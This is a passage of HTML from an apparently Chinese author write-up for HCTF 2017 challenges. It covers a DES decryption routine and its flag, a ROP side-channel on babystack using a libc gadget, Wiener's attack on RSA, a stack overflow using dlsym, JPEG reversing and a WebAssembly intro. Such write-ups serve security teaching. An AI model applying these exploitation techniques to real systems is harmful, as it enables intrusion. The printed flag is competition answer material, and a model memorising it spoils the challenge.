            <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">32</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>
                msgb<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">32</span><span class="token punctuation">]</span> <span class="token operator">^</span><span class="token operator">=</span> msgb<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token operator">/</span><span class="token operator">/</span> &#x5F02;&#x6216;    
            memcpy<span class="token punctuation">(</span>msgb <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> rt<span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        memcpy<span class="token punctuation">(</span>msgbt <span class="token operator">+</span> <span class="token number">33</span><span class="token punctuation">,</span> msgb <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        memcpy<span class="token punctuation">(</span>msgbt <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> msgb <span class="token operator">+</span> <span class="token number">33</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token constant">BatchSet</span><span class="token punctuation">(</span>msgb<span class="token punctuation">,</span> msgbt<span class="token punctuation">,</span> last_ch<span class="token punctuation">,</span> <span class="token number">64</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">/</span><span class="token operator">/</span> &#x672B;&#x7F6E;&#x6362;    
        <span class="token constant">BitToCh</span><span class="token punctuation">(</span>res<span class="token punctuation">,</span> msgb<span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">/</span><span class="token operator">/</span> &#x8F6C;&#x4E3A;&#x539F;&#x660E;&#x6587;    
    <span class="token punctuation">}</span>

    int main<span class="token punctuation">(</span>int arg<span class="token punctuation">,</span> char<span class="token operator">*</span> arv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        init_trans<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        char mode <span class="token operator">=</span> <span class="token string">&apos;d&apos;</span><span class="token punctuation">;</span>

        getKeys<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">/</span><span class="token operator">/</span> &#x5F97;&#x5230;<span class="token number">16</span>&#x8F6E;&#x8981;&#x7528;&#x5230;&#x7684;&#x5BC6;&#x94A5;    

        int i<span class="token punctuation">;</span>

        printf<span class="token punctuation">(</span><span class="token string">&quot;dec: &quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> msg<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span> i <span class="token operator">+</span><span class="token operator">=</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            dropMsg<span class="token punctuation">(</span>res<span class="token punctuation">,</span> msg <span class="token operator">+</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">/</span><span class="token operator">/</span> &#x5C06;&#x5BC6;&#x6587;&#x8F6C;&#x6362;&#x4E3A;&#x771F;&#x6B63;&#x7684;&#x5BC6;&#x6587;    
            <span class="token constant">DES</span><span class="token punctuation">(</span>res<span class="token punctuation">,</span> <span class="token constant">DECODE</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">/</span><span class="token operator">/</span> &#x89E3;&#x5BC6;    
            printf<span class="token punctuation">(</span><span class="token string">&quot;%s&quot;</span><span class="token punctuation">,</span> res<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        printf<span class="token punctuation">(</span><span class="token string">&quot;\n&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span></code></pre> <p>&#x7B80;&#x5355;&#x6765;&#x8BF4; &#x53EA;&#x8981;&#x628A;&#x52A0;&#x5BC6;&#x5B8F;[0, 16 ,1]&#x66FF;&#x6362;&#x4E3A;[15, -1, -1]&#x89E3;&#x5BC6;&#x5B8F;&#x5373;&#x53EF;&#x3002;</p> <p>flag:</p> <pre><code>hctf<span class="token punctuation">{</span><span class="token constant">Dr1v5r_M5ngM4n_2Oi7</span><span class="token punctuation">}</span></code></pre><p> <a href="http://img.blog.csdn.net/20171113195719931"target="_blank"class="fancybox"rel="grouped"title=""> <img alt=""class="img-responsive lazy"data-original="http://img.blog.csdn.net/20171113195719931"height="100%"src="https://www.ctfwp.com/gitbook/gitbook-plugin-lazyload/loading.gif"> </a><br>ps: &#x9644;&#x4E00;&#x5F20;&#x6210;&#x529F;cm&#x7684;&#x622A;&#x56FE;</p> <p> <a href="http://img.blog.csdn.net/20171113195719931"target="_blank"class="fancybox"rel="grouped"title=""> <img alt=""class="img-responsive lazy"data-original="http://img.blog.csdn.net/20171113195719931"height="100%"src="https://www.ctfwp.com/gitbook/gitbook-plugin-lazyload/loading.gif"> </a></p> <h3 id="babystack">babystack</h3> <p>&#x8FD9;&#x9898;&#x7684;&#x540D;&#x5B57;&#x53EB;babystack&#xFF0C;&#x7A0B;&#x5E8F;&#x4E2D;&#x662F;&#x4E00;&#x4E2A;&#x76F4;&#x63A5;&#x7684;&#x6808;&#x6EA2;&#x51FA;&#x3002;&#x800C;&#x4E14;&#x8FD8;&#x81EA;&#x5E26;&#x4E00;&#x6B21;&#x4EFB;&#x610F;&#x5730;&#x5740;&#x8BFB;&#x3002;<br>&#x5F53;&#x7136;&#x8FD9;&#x9898;&#x7684;&#x96BE;&#x70B9;&#x4E5F;&#x5F88;&#x7B80;&#x5355;&#xFF0C;&#x53EA;&#x6709;read&#xFF0C;write&#xFF0C;open&#xFF0C;exit&#x7CFB;&#x7EDF;&#x8C03;&#x7528;&#x3002;&#x4E4B;&#x6240;&#x4EE5;&#x641E;&#x51FA;&#x8FD9;&#x4E2A;&#x9898;&#x76EE;&#x662F;&#x53D7;defcon&#x7684;mute&#x90A3;&#x9898;&#x7684;&#x542F;&#x53D1;&#x3002;mute&#x90A3;&#x9898;&#x662F;&#x7528;shellcode&#x6765;&#x5B9E;&#x73B0;&#x7684;&#x4FA7;&#x4FE1;&#x9053;&#x653B;&#x51FB;&#x3002;&#x6240;&#x4EE5;&#x6211;&#x5C31;&#x60F3;&#x80FD;&#x5426;&#x7528;rop&#x6765;&#x5B9E;&#x73B0;&#x4FA7;&#x4FE1;&#x9053;&#x7684;&#x653B;&#x51FB;&#x3002;</p> <p>&#x4E0B;&#x9762;&#x662F;&#x6211;&#x5728;libc&#x91CC;&#x627E;&#x5230;&#x7684;&#x4E00;&#x4E2A;&#x53EF;&#x4EE5;&#x7528;&#x6765;&#x4FA7;&#x4FE1;&#x9053;&#x653B;&#x51FB;&#x7684;ROP</p> <pre><code>    <span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">00000000000</span>D72CE                 cmp     cl<span class="token punctuation">,</span> <span class="token punctuation">[</span>rsi<span class="token punctuation">]</span>
    <span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">00000000000</span>D72D0                 jz      short loc_D7266
    <span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">00000000000</span>D72D2                 pop     rbx
    <span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">00000000000</span>D72D3                 retn</code></pre><p>&#x5728;ret&#x4E4B;&#x540E;&#x7528;&#x4E00;&#x4E2A;read&#x51FD;&#x6570;&#x6765;block&#x4F4F;&#x4EE3;&#x7801;&#x3002;&#x800C;&#x6BD4;&#x8F83;&#x6210;&#x529F;&#x4E4B;&#x540E;&#x5219;&#x76F4;&#x63A5;crash&#x9000;&#x51FA;&#x3002;&#x4F7F;&#x7528;&#x8FD9;&#x79CD;&#x65B9;&#x6CD5;&#x6765;&#x9010;&#x5B57;&#x8282;&#x7684;&#x6BD4;&#x8F83;flag&#x3002;<br>&#x5F53;&#x7136;&#xFF0C;&#x89E3;&#x6CD5;&#x4E0D;&#x6B62;&#x8FD9;&#x4E00;&#x79CD;&#x3002;libc&#x91CC;&#x8FD8;&#x6709;&#x5F88;&#x591A;&#x79CD;&#x7684;rop&#x53EF;&#x4EE5;&#x7528;&#x6765;&#x8FDB;&#x884C;&#x4FA7;&#x4FE1;&#x9053;&#x653B;&#x51FB;&#x3002;&#x53EF;&#x4EE5;&#x770B;&#x770B;&#x9009;&#x624B;&#x4EEC;&#x7684;&#x89E3;&#x6CD5;.</p> <p>poc&#x89C1;<a href="https://github.com/zh-explorer/hctf2017-explorer/tree/master/babystack"target="_blank">github</a></p> <h3 id="babyre">babyre</h3> <p>&#x8FD9;&#x4E2A;&#x9898;&#x76EE;&#x7684;&#x96BE;&#x5EA6;&#x5176;&#x5B9E;&#x5904;&#x5728;&#x7B2C;&#x4E09;&#x5C42;&#x548C;&#x7B2C;&#x56DB;&#x5C42;&#x4E4B;&#x95F4;&#x3002;&#x5F53;&#x521D;&#x628A;&#x5B83;&#x653E;&#x7B2C;&#x56DB;&#x5C42;&#x5176;&#x5B9E;&#x6709;&#x70B9;&#x72B9;&#x8C6B;&#xFF0C;&#x56E0;&#x4E3A;&#x611F;&#x89C9;&#x4F1A;&#x6709;&#x8001;&#x53F8;&#x673A;&#x79D2;&#x6740;&#x4ED6;&#x3002;</p> <p>&#x8FD9;&#x4E2A;&#x9898;&#x76EE;&#x8BF4;&#x8D77;&#x6765;&#x5176;&#x5B9E;&#x5F88;&#x7B80;&#x7B54;&#xFF0C;&#x6211;&#x5199;&#x4E86;&#x4E00;&#x4E2A;&#x8499;&#x54E5;&#x9A6C;&#x5229;&#x4E58;&#x7B97;&#x6CD5;&#x548C;&#x4E00;&#x4E2A;&#x5927;&#x6574;&#x6570;&#x52A0;&#x51CF;&#x7684;&#x5E93;&#x3002;&#x719F;&#x6089;&#x5BC6;&#x7801;&#x5B66;&#x7684;&#x5927;&#x4F6C;&#x5E94;&#x8BE5;&#x77E5;&#x9053;&#x8499;&#x54E5;&#x9A6C;&#x5229;&#x4E58;&#x8FD0;&#x7B97;&#x7684;&#x4F5C;&#x7528;&#x5C31;&#x662F;&#x8FDB;&#x884C;&#x5FEB;&#x901F;&#x6A21;&#x5E42;&#x8FD0;&#x7B97;&#xFF0C;&#x5373;RSA&#x7684;&#x6838;&#x5FC3;&#x7B97;&#x6CD5;&#x3002;<br>&#x6709;&#x5173;&#x8499;&#x54E5;&#x9A6C;&#x5229;&#x7B97;&#x6CD5;&#x7684;&#x6587;&#x7AE0;&#x7F51;&#x4E0A;&#x5176;&#x5B9E;&#x6709;&#x5F88;&#x591A;&#xFF0C;&#x6211;&#x5C31;&#x4E0D;&#x518D;&#x8D58;&#x8FF0;&#x4E86;&#x3002;&#x4EE3;&#x7801;&#x4E2D;&#x53EA;&#x6709;e&#x548C;n&#x3002;&#x5C06;&#x8F93;&#x5165;&#x7684;flag&#x8F6C;&#x6362;&#x6210;&#x5927;&#x6570;&#x7684;&#x5F62;&#x5F0F;&#xFF0C;&#x7136;&#x540E;&#x505A;en = pow(f,e,n)&#x8F93;&#x51FA;&#x4E86;&#x5927;&#x6570;en&#x3002;&#x8FD9;&#x91CC;&#x7528;&#x4E86;&#x4E00;&#x4E2A;&#x975E;&#x5E38;&#x5927;&#x7684;e&#xFF0C;&#x4F7F;&#x5F97;&#x53EF;&#x4EE5;&#x7528;Wiener&apos;s attack&#x6765;&#x8BA1;&#x7B97;&#x51FA;d&#x7684;&#x503C;&#x3002;&#x7136;&#x540E;&#x7528;d&#x5373;&#x53EF;&#x89E3;&#x5BC6;&#x51FA;flag&#x3002;</p> <p>&#x4E4B;&#x6240;&#x4EE5;&#x8BA4;&#x4E3A;&#x4ED6;&#x7B80;&#x5355;&#xFF0C;&#x662F;&#x56E0;&#x4E3A;&#x5373;&#x4F7F;&#x4E0D;&#x77E5;&#x9053;&#x8499;&#x54E5;&#x9A6C;&#x5229;&#x4E58;&#x8FD0;&#x7B97;&#x4E5F;&#x80FD;&#x591F;&#x731C;&#x51FA;&#x662F;RSA&#x3002;&#x9996;&#x5148;&#x662F;&#x56E0;&#x4E3A;&#x5927;&#x6574;&#x6570;&#x52A0;&#x51CF;&#x4EE5;&#x53CA;&#x4E58;&#x8FD0;&#x7B97;&#xFF0C;&#x8FD9;&#x4E9B;&#x5927;&#x6574;&#x6570;&#x8FD0;&#x7B97;&#x8FD8;&#x662F;&#x5F88;&#x5BB9;&#x6613;&#x5C31;&#x53EF;&#x4EE5;&#x5206;&#x8FA8;&#x7684;&#x3002;&#x4E00;&#x65E6;&#x5206;&#x8FA8;&#x51FA;&#x8FD9;&#x4E9B;&#x8FD0;&#x7B97;&#xFF0C;&#x5E94;&#x8BE5;&#x5C31;&#x80FD;&#x8054;&#x60F3;&#x5230;RSA&#x3002;&#x7B2C;&#x4E8C;&#x4E2A;&#x5C31;&#x662F;&#x6A21;&#x5E42;&#x8FD0;&#x7B97;&#x5316;&#x7B80;&#x5F0F;&#x5B50;&#x3002;&#x5BF9;&#x4E8E;&#x4E00;&#x4E2A;D=C**E%N&#x7684;&#x5927;&#x6570;&#x8FD0;&#x7B97;&#xFF0C;&#x53EF;&#x4EE5;&#x91C7;&#x7528;&#x4E0B;&#x9762;&#x7684;&#x5316;&#x7B80;&#x5F0F;&#x5B50;&#x3002;</p> <pre><code>    <span class="token constant">D</span><span class="token operator">=</span><span class="token number">1</span>
    <span class="token constant">FOR</span> i<span class="token operator">=</span>n <span class="token constant">TO</span> <span class="token number">0</span>
        <span class="token constant">D</span><span class="token operator">=</span><span class="token constant">D</span><span class="token operator">*</span><span class="token constant">D</span> <span class="token operator">%</span> <span class="token constant">N</span>
        <span class="token constant">IF</span> <span class="token constant">E</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span> 
            <span class="token constant">D</span><span class="token operator">=</span><span class="token constant">D</span><span class="token operator">*</span><span class="token constant">C</span> <span class="token operator">%</span> <span class="token constant">N</span>
    <span class="token constant">RETURN</span> <span class="token constant">D</span></code></pre><p>&#x80FD;&#x770B;&#x51FA;&#x8FD9;&#x4E2A;&#x5F0F;&#x5B50;&#x662F;&#x6A21;&#x5E42;&#x8FD0;&#x7B97;&#x7684;&#x5316;&#x7B80;&#x5F0F;&#x5B50;&#xFF0C;&#x5373;&#x4F7F;&#x770B;&#x4E0D;&#x61C2;&#x4E58;&#x6CD5;&#x51FD;&#x6570;&#x662F;&#x4E2A;&#x4EC0;&#x4E48;&#x9B3C;&#x3002;&#x5E94;&#x8BE5;&#x4E5F;&#x80FD;&#x731C;&#x5230;&#x4EC0;&#x4E48;&#x4E86;&#x3002;</p> <h3 id="rroopp">rroopp</h3> <p>&#x4E4B;&#x6240;&#x4EE5;&#x5199;&#x8FD9;&#x4E2A;&#x9898;&#x76EE;&#xFF0C;&#x53EA;&#x6709;&#x4E00;&#x6B21;&#x5728;&#x5199;&#x5B9E;&#x9645;&#x6808;&#x6EA2;&#x51FA;&#x5229;&#x7528;&#x7684;&#x65F6;&#x5019;&#x78B0;&#x5230;&#x4E86;&#x8FD9;&#x4E2A;&#x60C5;&#x51B5;&#x3002;&#x6808;&#x6EA2;&#x51FA;&#x662F;&#x5728;&#x94FE;&#x63A5;&#x5E93;&#x4E2D;&#xFF0C;&#x6CA1;&#x6709;&#x6253;&#x5F00;&#x7684;&#x53EF;&#x4EE5;leak&#x7528;&#x7684;&#x6587;&#x4EF6;&#x63CF;&#x8FF0;&#x7B26;&#x3002;&#x800C;&#x4E3B;&#x7A0B;&#x5E8F;&#x5C31;&#x53EA;&#x6709;&#x8FD9;&#x4E48;&#x4E00;&#x70B9;&#x70B9;&#x4EE3;&#x7801;&#x3002;&#x5F53;&#x65F6;&#x81EA;&#x5DF1;&#x5199;rop&#x7684;&#x65F6;&#x5019;&#x611F;&#x89C9;&#x633A;&#x6709;&#x610F;&#x601D;&#x7684;&#xFF0C;&#x5C31;&#x62FF;&#x51FA;&#x6765;&#x5199;&#x4E86;&#x8FD9;&#x6837;&#x4E00;&#x4E2A;&#x9898;&#x76EE;(&#x4E3B;&#x7A0B;&#x5E8F;&#x662F;&#x6211;&#x76F4;&#x63A5;patch&#x5F53;&#x521D;&#x90A3;&#x4E2A;&#x7A0B;&#x5E8F;&#x6765;&#x7684;&#xFF0C;&#x6CA1;&#x6709;&#x6E90;&#x7801;&#x3002;&#x53EF;&#x4EE5;&#x731C;&#x731C;&#x662F;&#x4EC0;&#x4E48;&#x7A0B;&#x5E8F;&#xFF1A;)</p> <p>&#x5F53;&#x7136;launch.so&#x5C31;&#x662F;&#x6211;&#x81EA;&#x5DF1;&#x5199;&#x7684;&#x7A0B;&#x5E8F;&#x4E86;&#x3002;&#x91CC;&#x9762;&#x5927;&#x81F4;&#x6A21;&#x62DF;&#x4E86;ipv4&#x5305;&#x89E3;&#x6790;&#x7684;&#x8FC7;&#x7A0B;&#x3002;&#x5F53;&#x7136;&#x4E5F;&#x662F;&#x4E00;&#x4E2A;&#x76F4;&#x63A5;&#x7684;&#x6808;&#x6EA2;&#x51FA;&#x3002;&#x5728;&#x6700;&#x540E;&#x5408;&#x5E76;&#x5305;&#x7684;&#x65F6;&#x5019;&#x5E76;&#x6CA1;&#x6709;&#x68C0;&#x67E5;&#x957F;&#x5EA6;&#x800C;&#x662F;&#x4F7F;&#x7528;&#x4E86;&#x4E00;&#x4E2A;&#x56FA;&#x5B9A;&#x957F;&#x5EA6;&#x7684;&#x6808;&#x7F13;&#x51B2;&#x533A;&#x3002;</p> <p>&#x5F53;&#x7136;&#x867D;&#x7136;binary&#x6BD4;&#x8F83;&#x5C0F;&#xFF0C;&#x5176;&#x5B9E;&#x8FD8;&#x662F;&#x6709;&#x633A;&#x591A;&#x53EF;&#x4EE5;&#x7528;&#x7684;gadget&#x7684;&#x3002;&#x8FD9;&#x91CC;&#x8FD8;&#x6709;&#x4E00;&#x4E2A;&#x5F88;&#x597D;&#x73A9;&#x7684;&#x6280;&#x5DE7;&#xFF0C;&#x5C31;&#x662F;dlsym&#x7684;handle&#x53EF;&#x4EE5;&#x6307;&#x5B9A;&#x4E3A;RTLD_DEFAULT&#x548C;RTLD_NEXT&#x6765;&#x4ECE;&#x5DF2;&#x7ECF;&#x52A0;&#x8F7D;&#x7684;&#x52A8;&#x6001;&#x94FE;&#x63A5;&#x5E93;&#x4E2D;&#x67E5;&#x627E;&#x51FD;&#x6570;&#x3002;&#x6240;&#x4EE5;&#x65E0;&#x9700;&#x6307;&#x5B9A;handle&#x7684;&#x503C;&#x53EF;&#x4EE5;&#x53EF;&#x4EE5;&#x8C03;&#x7528;libc&#x4E2D;&#x7684;&#x51FD;&#x6570;&#x7684;&#x3002;</p> <h3 id="old-driver">old driver</h3> <p>&#x8FD9;&#x4E2A;&#x9006;&#x5411;&#x9898;&#x76EE;&#x5176;&#x5B9E;&#x4E5F;&#x662F;&#x4E00;&#x4E2A;&#x7B97;&#x6CD5;&#x9898;&#xFF0C;&#x5F88;&#x53EF;&#x60DC;&#x6CA1;&#x6709;&#x4EBA;&#x80FD;&#x505A;&#x51FA;&#x6765;&#x3002;&#x5199;&#x8FD9;&#x4E2A;&#x9898;&#x76EE;&#x7684;&#x521D;&#x8877;&#x662F;&#x6211;&#x4E0A;&#x5B66;&#x671F;&#x4E0A;&#x7684;&#x6570;&#x636E;&#x538B;&#x7F29;&#x5B9E;&#x9A8C;&#x3002;&#x8FD9;&#x4E2A;&#x7B97;&#x6CD5;&#x671F;&#x672B;&#x5360;15&#x5206;huaji.jpg</p> <p>&#x597D;&#x5427;&#xFF0C;&#x8FD9;&#x4E2A;&#x538B;&#x7F29;&#x7B97;&#x6CD5;&#x5176;&#x5B9E;&#x5C31;&#x662F;jpeg&#x538B;&#x7F29;&#x7B97;&#x6CD5;&#x62C9;&#x3002;&#x5F53;&#x7136;&#x548C;&#x73B0;&#x5728;&#x901A;&#x7528;&#x7684;jpg&#x56FE;&#x7247;&#x7684;&#x538B;&#x7F29;&#x7B97;&#x6CD5;&#x8FD8;&#x662F;&#x6709;&#x70B9;&#x5DEE;&#x522B;&#x7684;&#xFF0C;&#x662F;&#x6700;&#x521D;&#x6700;&#x7B80;&#x5355;&#x7684;&#x90A3;&#x4E2A;&#x7248;&#x672C;&#x3002;&#x6709;&#x5173;jpeg&#x538B;&#x7F29;&#x7B97;&#x6CD5;&#x7684;&#x4ECB;&#x7ECD;&#x5176;&#x5B9E;&#x633A;&#x591A;&#x7684;&#x3002;&#x5982;&#x679C;&#x4E0D;&#x662F;&#x50CF;&#x6211;&#x4E00;&#x6837;&#x4E0D;&#x4E60;&#x60EF;&#x7528;MATLAB&#x7684;&#x8BDD;&#x3002;&#x5176;&#x5B9E;&#x7528;MATLAB&#x89E3;&#x8FD9;&#x4E1C;&#x897F;&#x5176;&#x5B9E;&#x662F;&#x6700;&#x5FEB;&#x7684;&#x3002;</p> <p>&#x5F53;&#x7136;jpeg&#x538B;&#x7F29;&#x5176;&#x5B9E;&#x4E5F;&#x6709;&#x5F88;&#x591A;&#x7684;&#x7279;&#x5F81;&#x53EF;&#x4EE5;&#x67E5;&#x627E;&#x7684;&#x3002;&#x5305;&#x62EC;DFT&#x7B97;&#x6CD5;&#x5B9E;&#x73B0;&#xFF0C;&#x5305;&#x62EC;&#x91CF;&#x5316;&#x7528;&#x7684;&#x6807;&#x51C6;&#x91CF;&#x5316;&#x8868;&#xFF0C;&#x5305;&#x62EC;&#x6700;&#x540E;&#x505A;&#x54C8;&#x5F17;&#x66FC;&#x7F16;&#x7801;&#x6240;&#x7528;&#x7684;&#x54C8;&#x5F17;&#x66FC;&#x8868;&#x3002;&#x5176;&#x5B9E;&#x90FD;&#x662F;&#x975E;&#x5E38;&#x660E;&#x663E;&#x7684;&#x7279;&#x5F81;&#x3002;&#x6700;&#x660E;&#x663E;&#x7684;&#x5C31;&#x662F;jpeg&#x538B;&#x7F29;&#x6240;&#x4F7F;&#x7528;&#x7684;&#x91CF;&#x5316;&#x8868;&#x4E86;&#x3002;&#x62A0;&#x51FA;&#x6765;&#x4E00;&#x67E5;&#x5C31;&#x80FD;&#x53D1;&#x73B0;&#x3002;</p> <p>decode.py&#x5C31;&#x662F;&#x6211;&#x81EA;&#x5DF1;&#x5199;&#x7684;&#x91CD;&#x5EFA;jpeg&#x7528;&#x7684;&#x51FD;&#x6570;&#x3002;&#x5F53;&#x7136;&#x5982;&#x679C;&#x53D1;&#x73B0;&#x91CD;&#x5EFA;&#x7684;&#x56FE;&#x50CF;&#x975E;&#x5E38;&#x9B54;&#x6027;&#x4E5F;&#x4E0D;&#x8981;&#x60CA;&#x8BB6;&#x3002;&#x662F;&#x6211;&#x538B;&#x7F29;&#x6BD4;&#x7387;&#x8C03;&#x6574;&#x7684;&#x592A;&#x9AD8;&#x7684;&#x539F;&#x56E0;&#x3002;&#x53CD;&#x6B63;&#x80FD;&#x770B;&#x5230;flag&#x5C31;&#x53EF;&#x4EE5;&#x4E86;2333</p> <h3 id="online-encryptor">online encryptor</h3> <h4 id="&#x80CC;&#x666F;">&#x80CC;&#x666F;</h4> <p>&#x8FD9;&#x9898;&#x7531;&#x4E8E;&#x653E;&#x9898;&#x7684;&#x65F6;&#x5019;&#x5931;&#x8BEF;&#x6CA1;&#x628A;&#x9898;&#x5F00;&#x59CB;&#x5C31;&#x653E;&#x4E0A;&#x53BB;&#xFF0C;&#x6240;&#x4EE5;&#x5269;&#x4E0B;&#x7684;&#x65F6;&#x95F4;&#x53EF;&#x80FD;&#x4E0D;&#x591F;&#x53BB;&#x505A;&#x4E86;&#x3002;&#x800C;&#x4E14;&#x597D;&#x50CF;&#x6709;&#x88AB;&#x9898;&#x76EE;&#x540D;&#x8BEF;&#x5BFC;&#x5230;&#x7684;&#x4EBA;&#xFF08; &#x3002;&#x56DE;&#x5230;&#x9898;&#x76EE;&#xFF0C;&#x8FD9;&#x9898;&#x662F;&#x4E00;&#x4E2A;&#x62AB;&#x7740;web&#x548C;crypt&#x76AE;&#x7684;pwn&#x9898;&#x3002;&#x4E8B;&#x5B9E;&#x4E0A;&#xFF0C;&#x5728;&#x4E4B;&#x524D;&#x521A;&#x770B;&#x5230;wasm&#x7684;&#x65F6;&#x5019;&#x6211;&#x5C31;&#x6709;&#x60F3;&#x80FD;&#x4E0D;&#x80FD;&#x641E;&#x4E2A;pwn&#x51FA;&#x6765;&#x3002;&#x7136;&#x540E;&#x8FD9;&#x6B21;&#x4E5F;&#x7B97;&#x662F;&#x5B9E;&#x73B0;&#x4E86;&#x81EA;&#x5DF1;&#x7684;&#x4E00;&#x4E9B;&#x60F3;&#x6CD5;&#x3002;</p> <p>webassembly (&#x4EE5;&#x4E0B;&#x7B80;&#x79F0;wasm) &#x6280;&#x672F;&#x76EE;&#x524D;&#x53EF;&#x4EE5;&#x8BF4;&#x5E76;&#x4E0D;&#x5B8C;&#x5584;&#xFF0C;&#x800C;&#x4E14;&#x6211;&#x4E5F;&#x5E76;&#x4E0D;&#x7B97;&#x662F;&#x4E86;&#x89E3;&#x4E86;&#x6574;&#x4E2A;&#x7CFB;&#x7EDF;&#x7684;&#x5168;&#x8C8C;&#xFF0C;&#x56E0;&#x6B64;&#x5982;&#x679C;&#x6709;&#x7406;&#x89E3;&#x4E0D;&#x5230;&#x4F4D;&#x7684;&#x5730;&#x65B9;&#x8BF7;&#x89C1;&#x8C05;&#xFF0C;&#x6B22;&#x8FCE;&#x4E00;&#x8D77;&#x8BA8;&#x8BBA;&#x3002;</p> <p>&#x4E8B;&#x5B9E;&#x4E0A;&#xFF0C;&#x5728;wasm&#x6280;&#x672F;&#x63D0;&#x51FA;&#x4E4B;&#x524D;&#x5C31;&#x5DF2;&#x7ECF;&#x6709;&#x7C7B;&#x4F3C;&#x6280;&#x672F;&#x51FA;&#x73B0;&#x4E86;&#xFF08;asm.js&#xFF09;&#xFF0C;wasm&#x548C;asm.js&#x4E0D;&#x540C;&#x7684;&#x662F;wasm&#x521B;&#x5EFA;&#x4E86;&#x4E8C;&#x8FDB;&#x5236;&#x6587;&#x4EF6;&#x683C;&#x5F0F;&#xFF08;.wasm&#xFF09;&#x548C;&#x65B0;&#x7684;&#x6C47;&#x7F16;&#x8BED;&#x8A00;&#x3002;&#x6BD4;&#x5982;helloword&#x7684;&#x6C47;&#x7F16;&#x770B;&#x4E0A;&#x53BB;&#x5C31;&#x662F;&#x8FD9;&#x6837;&#x7684;&#xFF08;&#x4F1A;lisp&#x7684;&#x540C;&#x5B66;&#x770B;&#x8D77;&#x6765;&#x5927;&#x6982;&#x6CA1;&#x5565;&#x9E2D;&#x68A8;&#xFF09;</p> <pre><code>    <span class="token punctuation">(</span><span class="token keyword">module</span>
     <span class="token punctuation">(</span>type <span class="token variable">$FUNCSIG</span><span class="token variable">$ii</span> <span class="token punctuation">(</span>func <span class="token punctuation">(</span>param i32<span class="token punctuation">)</span> <span class="token punctuation">(</span>result i32<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
     <span class="token punctuation">(</span>type <span class="token variable">$FUNCSIG</span><span class="token variable">$iii</span> <span class="token punctuation">(</span>func <span class="token punctuation">(</span>param i32 i32<span class="token punctuation">)</span> <span class="token punctuation">(</span>result i32<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
     <span class="token punctuation">(</span>import <span class="token string">&quot;env&quot;</span> <span class="token string">&quot;iprintf&quot;</span> <span class="token punctuation">(</span>func <span class="token variable">$iprintf</span> <span class="token punctuation">(</span>param i32 i32<span class="token punctuation">)</span> <span class="token punctuation">(</span>result i32<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
     <span class="token punctuation">(</span>table <span class="token number">0</span> anyfunc<span class="token punctuation">)</span>
     <span class="token punctuation">(</span>memory $<span class="token number">0</span> <span class="token number">1</span><span class="token punctuation">)</span>
     <span class="token punctuation">(</span>data <span class="token punctuation">(</span>i32<span class="token punctuation">.</span>const <span class="token number">16</span><span class="token punctuation">)</span> <span class="token string">&quot;hello world!\00&quot;</span><span class="token punctuation">)</span>
     <span class="token punctuation">(</span>export <span class="token string">&quot;memory&quot;</span> <span class="token punctuation">(</span>memory $<span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
     <span class="token punctuation">(</span>export <span class="token string">&quot;hello&quot;</span> <span class="token punctuation">(</span>func <span class="token variable">$hello</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
     <span class="token punctuation">(</span>export <span class="token string">&quot;test&quot;</span> <span class="token punctuation">(</span>func <span class="token variable">$test</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
     <span class="token punctuation">(</span>func <span class="token variable">$hello</span>
      <span class="token punctuation">(</span>drop
       <span class="token punctuation">(</span>call <span class="token variable">$iprintf</span>
        <span class="token punctuation">(</span>i32<span class="token punctuation">.</span>const <span class="token number">16</span><span class="token punctuation">)</span>
        <span class="token punctuation">(</span>i32<span class="token punctuation">.</span>const <span class="token number">0</span><span class="token punctuation">)</span>
       <span class="token punctuation">)</span>
      <span class="token punctuation">)</span>
     <span class="token punctuation">)</span>
     <span class="token punctuation">(</span>func <span class="token variable">$test</span> <span class="token punctuation">(</span>result i32<span class="token punctuation">)</span>
